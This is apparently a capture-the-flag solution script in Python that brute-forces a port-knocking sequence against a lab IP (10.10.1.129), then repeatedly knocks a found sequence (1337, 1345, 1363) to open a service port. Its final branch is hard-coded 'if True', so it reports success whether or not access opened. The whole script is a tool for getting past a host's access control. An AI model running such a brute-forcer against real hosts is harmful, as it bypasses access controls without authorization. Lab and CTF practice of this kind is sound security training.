import socket
import itertools
from time import sleep


def knock_ports(host, ports):
    """Send SYN packets to the given ports (a knock sequence)"""
    for port in ports:
        try:
            # Create a socket and attempt to connect (SYN packet)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((host, port))
            s.close()
        except:
            # We don't care about connection errors - we're just sending SYN
            pass
        sleep(0.1)  # Small delay between knocks


def check_access(host, port_to_check):
    """Check if the service port is now accessible"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((host, port_to_check))
        s.close()
        return True
    except:
        return False


def brute_force_knock(host, port_range, sequence_length=3, check_port=1337):
    """Brute force all possible knock sequences"""
    ports = range(port_range[0], port_range[1] + 1)
    total_combinations = (port_range[1] - port_range[0] + 1) ** sequence_length
    tried = 0

    print(f"Starting brute force of {total_combinations} possible combinations...")

    for sequence in itertools.product(ports, repeat=sequence_length):
        tried += 1
        if tried % 10 == 0:
            print(f"Tried {tried}/{total_combinations} combinations...")

        # Perform the knock sequence
        knock_ports(host, sequence)

        # Check if the service port is now open
        if check_access(host, check_port):
            print(f"\nSUCCESS! Found working sequence: {sequence}")
            return sequence

    print("\nNo working sequence found.")
    return None


if __name__ == "__main__":
    target_host = "10.10.1.129"  # Change this to the target IP
    port_range = (1337, 1377)  # The range mentioned in the message
    service_port = 80  # Common port to check after knocking

#    working_sequence = brute_force_knock(
#        target_host, port_range, check_port=service_port
#    )
    knock_ports(target_host, (1337, 1345, 1363)) 
    knock_ports(target_host, (1337, 1345, 1363)) 
    knock_ports(target_host, (1337, 1345, 1363)) 
    knock_ports(target_host, (1337, 1345, 1363)) 
    knock_ports(target_host, (1337, 1345, 1363)) 
    knock_ports(target_host, (1337, 1345, 1363)) 
    knock_ports(target_host, (1337, 1345, 1363)) 

    if True:
        print("You should now have access to the service.")
        print(f"Try connecting to {target_host}:{service_port}")
    else:
        print("Failed to find a working port knocking sequence.")
